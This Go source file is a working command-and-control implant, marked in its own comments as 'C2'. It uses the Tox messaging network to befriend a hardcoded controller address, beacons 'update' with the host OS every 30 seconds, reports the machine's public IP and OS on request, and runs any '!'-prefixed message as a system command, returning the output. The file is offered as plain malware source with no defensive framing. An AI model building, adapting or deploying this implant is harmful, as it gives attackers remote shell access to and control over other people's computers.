package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os/exec"
	"runtime"
	"strings"

	"time"

	tox "github.com/TokTok/go-toxcore-c"
)

func init() {
	log.SetFlags(log.Flags() | log.Lshortfile)
}

// Tox bootstrap node (nodes.tox.chat)
var server = []interface{}{
	"205.185.116.116", uint16(33445), "A179B09749AC826FF01F37A9613F6B57118AE014D4196A0E1105A98F93A54702",
}

var address = "67E1D07953FDBF050404DCECCEF8D75AFB6C32B6601427D289B6473649E9CD13F462D28978A7" // C2 Address
var fname = "./tox.data"
var debug = false
var nickPrefix = "Odin"
var statusText = "Revered immortal."

// Commands - Handle incoming commands
func Commands(t *tox.Tox, friendNumber uint32, command string) {
	if command == "ip" {
		resp, err := http.Get("http://checkip.amazonaws.com/")
		if err != nil {
			panic(err)
		}
		defer resp.Body.Close()
		body, err := ioutil.ReadAll(resp.Body)

		SendMessage(t, friendNumber, string(body))
	}
	if command == "os" {
		os := runtime.GOOS
		SendMessage(t, friendNumber, os)

	}
	if strings.HasPrefix(command, "!") {
		command := strings.TrimPrefix(command, "! ")

		arguments := strings.Fields(command)
		head := arguments[0]
		args := arguments[1:len(arguments)]

		out, err := exec.Command(head, args...).Output()
		if err != nil {
			log.Println(err)
		}
		SendMessage(t, friendNumber, string(out))
	}
}

// SendMessage - Return message to C2
func SendMessage(t *tox.Tox, friendNumber uint32, message string) {
	n, err := t.FriendSendMessage(friendNumber, message)
	if err != nil {
		log.Println(n, err)
	}
}

func main() {
	opt := tox.NewToxOptions()
	if tox.FileExist(fname) {
		data, err := ioutil.ReadFile(fname)
		if err != nil {
			log.Println(err)
		} else {
			opt.Savedata_data = data
			opt.Savedata_type = tox.SAVEDATA_TYPE_TOX_SAVE
		}
	}
	opt.Tcp_port = 33445
	var t *tox.Tox
	for i := 0; i < 5; i++ {
		t = tox.NewTox(opt)
		if t == nil {
			opt.Tcp_port++
		} else {
			break
		}
	}

	r, err := t.Bootstrap(server[0].(string), server[1].(uint16), server[2].(string))
	r2, err := t.AddTcpRelay(server[0].(string), server[1].(uint16), server[2].(string))
	if debug {
		log.Println("bootstrap:", r, err, r2)
	}

	pubkey := t.SelfGetPublicKey()
	seckey := t.SelfGetSecretKey()
	toxid := t.SelfGetAddress()
	if debug {
		log.Println("keys:", pubkey, seckey, len(pubkey), len(seckey))
	}
	log.Println("toxid:", toxid)

	defaultName := t.SelfGetName()
	humanName := nickPrefix + toxid[0:5]
	if humanName != defaultName {
		t.SelfSetName(humanName)
	}
	humanName = t.SelfGetName()
	if debug {
		log.Println(humanName, defaultName, err)
	}

	defaultStatusText, err := t.SelfGetStatusMessage()
	if defaultStatusText != statusText {
		t.SelfSetStatusMessage(statusText)
	}
	if debug {
		log.Println(statusText, defaultStatusText, err)
	}

	sz := t.GetSavedataSize()
	sd := t.GetSavedata()
	if debug {
		log.Println("savedata:", sz, t)
		log.Println("savedata", len(sd), t)
	}
	err = t.WriteSavedata(fname)
	if debug {
		log.Println("savedata write:", err)
	}

	// Add C2
	t.FriendAdd(address, "incoming")

	// Send updates to C2 to show the server you are online
	go func() {
		for {
			time.Sleep(30 * time.Second)
			fmt.Println("Send update")
			fv := t.SelfGetFriendList()
			for _, fno := range fv {
				if err != nil {
					log.Println(err)
				}
				SendMessage(t, fv[fno], "update  "+runtime.GOOS)
			}
		}

	}()

	// Recieve commands
	t.CallbackFriendMessage(func(t *tox.Tox, friendNumber uint32, message string, userData interface{}) {
		if debug {
			log.Println("on friend message:", friendNumber, message)
		}
		Commands(t, friendNumber, message)
	}, nil)

	// toxcore loops
	shutdown := false
	loopc := 0
	itval := 0
	for !shutdown {
		iv := t.IterationInterval()
		if iv != itval {
			if debug {
				if itval-iv > 20 || iv-itval > 20 {
					log.Println("tox itval changed:", itval, iv)
				}
			}
			itval = iv
		}

		t.Iterate()
		status := t.SelfGetConnectionStatus()
		if loopc%5500 == 0 {
			if status == 0 {
				if debug {
					fmt.Print(".")
				}
			} else {
				if debug {
					fmt.Print(status, ",")
				}
			}
		}
		loopc++
		time.Sleep(1000 * 50 * time.Microsecond)
	}

	t.Kill()
}

func makekey(no uint32, a0 interface{}, a1 interface{}) string {
	return fmt.Sprintf("%d_%v_%v", no, a0, a1)
}

func init() {
	tox.KeepPkg()
}
